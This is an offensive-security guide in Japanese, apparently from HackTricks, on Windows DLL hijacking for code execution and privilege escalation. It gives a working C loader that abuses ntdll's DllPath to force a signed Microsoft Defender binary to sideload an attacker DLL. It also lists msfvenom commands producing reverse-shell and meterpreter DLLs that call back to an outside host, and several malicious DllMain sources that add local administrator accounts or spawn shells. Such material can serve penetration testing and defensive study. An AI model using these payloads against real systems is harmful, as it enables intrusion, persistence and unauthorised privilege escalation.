# Dll Hijacking

{{#include ../../banners/hacktricks-training.md}}



## 基本情報

DLL Hijacking は、信頼されたアプリケーションに悪意ある DLL を読み込ませるよう操作する手法です。この用語には **DLL Spoofing, Injection, and Side-Loading** のような複数の戦術が含まれます。主に code execution や persistence を目的とし、稀に privilege escalation に用いられます。ここでは escalation に注目していますが、hijacking の手法自体は目的にかかわらず基本的に同じです。

### 一般的な手法

DLL hijacking にはいくつかの方法があり、各手法の有効性はアプリケーションの DLL ロード戦略によって異なります:

1. **DLL Replacement**: 正規の DLL を悪意あるものと差し替えます。元の DLL の機能を保持するために DLL Proxying を使用することがあります。
2. **DLL Search Order Hijacking**: 悪意ある DLL を正規のものより先に検索されるパスに配置し、アプリケーションの検索順序を悪用します。
3. **Phantom DLL Hijacking**: アプリケーションが存在しない必要な DLL と誤認して読み込むような悪意ある DLL を作成します。
4. **DLL Redirection**: %PATH% や .exe.manifest / .exe.local といった検索パラメータを変更して、アプリケーションを悪意ある DLL に向けます。
5. **WinSxS DLL Replacement**: WinSxS ディレクトリ内で正規の DLL を悪意あるものと置換する手法で、DLL side-loading と関連することが多いです。
6. **Relative Path DLL Hijacking**: コピーされたアプリケーションと同じユーザ制御のディレクトリに悪意ある DLL を置く手法で、Binary Proxy Execution に類似します。

## 欠落している DLL の検出

システム内で欠落している DLL を見つける最も一般的な方法は、sysinternals の [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) を実行し、次の 2 つのフィルタを設定することです:

![](<../../images/image (311).png>)

![](<../../images/image (313).png>)

そして **File System Activity** のみを表示します:

![](<../../images/image (314).png>)

一般的な missing dlls を探す場合は、これを数秒間実行し続けます。特定の実行ファイル内の missing dll を探す場合は、"Process Name" "contains" "\<exec name>" のような追加フィルタを設定し、対象を実行してイベントのキャプチャを停止してください。

## 欠落している DLL の悪用

権限昇格を狙う場合、最も有効なのは、特権プロセスが読み込もうとする DLL をそのプロセスが検索する場所のいずれかに書き込めることです。つまり、DLL が元の DLL のあるフォルダより先に検索されるフォルダに悪意ある DLL を書き込める（稀なケース）か、DLL が検索されるフォルダに書き込みができ、かつ元の DLL がどのフォルダにも存在しない場合に有効です。

### Dll Search Order

**Inside the** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **you can find how the Dlls are loaded specifically.**

Windows アプリケーションは、あらかじめ定義された検索パスのセットに従い、特定の順序で DLL を探します。悪意ある DLL をこれらのディレクトリのいずれかに戦略的に配置すると、正規の DLL より先に読み込まれてしまい、DLL hijacking の問題が発生します。これを防ぐための対策として、アプリケーション側で必要な DLL を参照する際に絶対パスを使用することが有効です。

32-bit システムにおける DLL 検索順序は以下の通りです:

1. アプリケーションが読み込まれたディレクトリ。
2. システムディレクトリ。パスを取得するには [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) 関数を使用します。(_C:\Windows\System32_)
3. 16-bit システムディレクトリ。パスを取得する関数はありませんが検索されます。(_C:\Windows\System_)
4. Windows ディレクトリ。パスを取得するには [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) 関数を使用します。(_C:\Windows_)
5. カレントディレクトリ。
6. PATH 環境変数に列挙されたディレクトリ。これは App Paths レジストリキーで指定されたアプリケーション毎のパスを含まない点に注意してください。App Paths キーは DLL 検索パスの計算には使用されません。

これは SafeDllSearchMode が有効な場合のデフォルトの検索順序です。無効にするとカレントディレクトリの優先度が 2 番目に上がります。この機能を無効にするには、HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\\SafeDllSearchMode のレジストリ値を作成し、0 に設定します（デフォルトは有効）。

[**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) 関数が **LOAD_WITH_ALTERED_SEARCH_PATH** で呼ばれると、検索は LoadLibraryEx が読み込んでいる実行モジュールのディレクトリから開始されます。

最後に、DLL が名前だけでなく絶対パスを指定してロードされる場合があります。その場合、その DLL は指定されたパスでのみ検索されます（その DLL に依存関係がある場合、それらは名前のみで読み込まれた場合と同様に検索されます）。

検索順序を変更する他の方法もありますが、ここでは説明しません。

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

新しく作成するプロセスの DLL 検索パスに決定的に影響を与える高度な方法のひとつは、ntdll のネイティブ API を使ってプロセスを生成する際に RTL_USER_PROCESS_PARAMETERS の DllPath フィールドを設定することです。ここに攻撃者が制御するディレクトリを指定すると、インポートされた DLL を名前で解決する（絶対パスではなく、セーフなロードフラグを使っていない）ターゲットプロセスに対して、そのディレクトリから悪意ある DLL を読み込ませることが可能になります。

要点
- RtlCreateProcessParametersEx でプロセスパラメータを構築し、制御下のフォルダを指すカスタム DllPath を指定します（例: dropper/unpacker が存在するディレクトリ）。
- RtlCreateUserProcess でプロセスを作成します。ターゲットバイナリが名前で DLL を解決すると、ローダはこの DllPath を参照するため、悪意ある DLL がターゲット EXE と同じ場所に置かれていなくても確実に sideloading できます。

注意点 / 制限事項
- これは作成される子プロセスに影響するもので、現在のプロセスにのみ影響する SetDllDirectory とは異なります。
- ターゲットは名前で DLL をインポートまたは LoadLibrary する必要があります（絶対パスではなく、LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories を使用していないこと）。
- KnownDLLs やハードコードされた絶対パスはハイジャックできません。Forwarded exports や SxS によって優先順位が変わる場合があります。

Minimal C example (ntdll, wide strings, simplified error handling):
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
運用上の使用例
- Place a malicious xmllite.dll (exporting the required functions or proxying to the real one) in your DllPath directory.
- Launch a signed binary known to look up xmllite.dll by name using the above technique. The loader resolves the import via the supplied DllPath and sideloads your DLL.

この手法は実際にマルチステージのサイドローディングチェインを引き起こす事例で観測されています：最初のランチャーがヘルパー DLL を配置し、それが Microsoft-signed でハイジャック可能なバイナリをカスタム DllPath で起動して、ステージングディレクトリから攻撃者の DLL を強制的に読み込ませます。


#### Exceptions on dll search order from Windows docs

Certain exceptions to the standard DLL search order are noted in Windows documentation:

- When a **DLL that shares its name with one already loaded in memory** is encountered, the system bypasses the usual search. Instead, it performs a check for redirection and a manifest before defaulting to the DLL already in memory. **In this scenario, the system does not conduct a search for the DLL**.
- In cases where the DLL is recognized as a **known DLL** for the current Windows version, the system will utilize its version of the known DLL, along with any of its dependent DLLs, **forgoing the search process**. The registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** holds a list of these known DLLs.
- Should a **DLL have dependencies**, the search for these dependent DLLs is conducted as though they were indicated only by their **module names**, regardless of whether the initial DLL was identified through a full path.

### 権限の昇格

**要件**:

- **異なる権限** (horizontal or lateral movement) の下で動作している、または動作する予定のプロセスで、**DLL が存在しない**ものを特定する。
- **DLL が検索される**任意の**ディレクトリ**に対して**書き込みアクセス**があることを確認する。この場所は実行ファイルのディレクトリやシステムパス内のディレクトリである可能性がある。

確かに要件を見つけるのは難しく、デフォルトでは特権実行ファイルが DLL を欠いていることは稀であり、システムパスのフォルダに書き込み権限があるのは通常あり得ません（デフォルトでは不可能です）。しかし、設定ミスのある環境ではこれが可能になることがあります。もし運良く要件を満たす環境を見つけたら、[UACME](https://github.com/hfiref0x/UACME) プロジェクトを確認してみてください。プロジェクトの主な目的は **bypass UAC** ですが、使用可能な Windows バージョン向けの **PoC**（おそらく書き込み権限のあるフォルダのパスを変更するだけで済みます）が見つかるかもしれません。

注意: **フォルダ内の権限を確認する**には、次を実行してください:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
そして、**PATH内のすべてのフォルダの権限を確認する**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
executable の imports と dll の exports は以下のコマンドで確認できます:
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
For a full guide on how to **Dll Hijacking を悪用して権限を昇格する** with permissions to write in a **System Path folder** check:


{{#ref}}
dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md
{{#endref}}

### 自動化ツール

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)は system PATH 内の任意のフォルダに書き込み権限があるかをチェックします。\
この脆弱性を発見するための他の興味深い自動化ツールは **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ and _Write-HijackDll_ です。

### 例

もし悪用可能なシナリオを見つけた場合、成功させるために最も重要なことの一つは、実行ファイルがそこからインポートするすべての関数を少なくともエクスポートする **dll を作成すること** です。なお、Dll Hijacking は [escalate from Medium Integrity level to High **(bypassing UAC)**](../authentication-credentials-uac-and-efs.md#uac) や [**High Integrity to SYSTEM**](#from-high-integrity-to-system) への昇格に便利である点に注意してください。実行目的の dll hijacking に焦点を当てたこの調査内には、**有効な dll を作成する方法** の例があります: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
さらに、**next sectio**n ではテンプレートとして役立ついくつかの **basic dll codes** や、不要な関数をエクスポートした **dll** を作成するための基本的なコード例が見つかります。

## **Dll を作成およびコンパイルする**

### **Dll Proxifying**

基本的に **Dll proxy** はロードされたときにあなたの悪意あるコードを **実行できる** 一方で、実際のライブラリへのすべての呼び出しを中継して期待される動作を **公開し動作する** ことができる Dll です。

ツール [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) や [**Spartacus**](https://github.com/Accenture/Spartacus) を使うと、実行ファイルを指定してプロキシ化したいライブラリを選び **generate a proxified dll** する、あるいは Dll を指定して **generate a proxified dll** することができます。

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**meterpreter (x86)を取得する:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**ユーザーを作成する (x86、x64バージョンは見当たりませんでした):**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Your own

注意: 多くの場合、コンパイルする Dll は被害者プロセスによってロードされる複数の関数を必ず **export several functions** している必要があります。これらの関数が存在しないと、**binary won't be able to load**（ロードできず）、**exploit will fail**。
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
## 参考文献

- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)



- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)


{{#include ../../banners/hacktricks-training.md}}
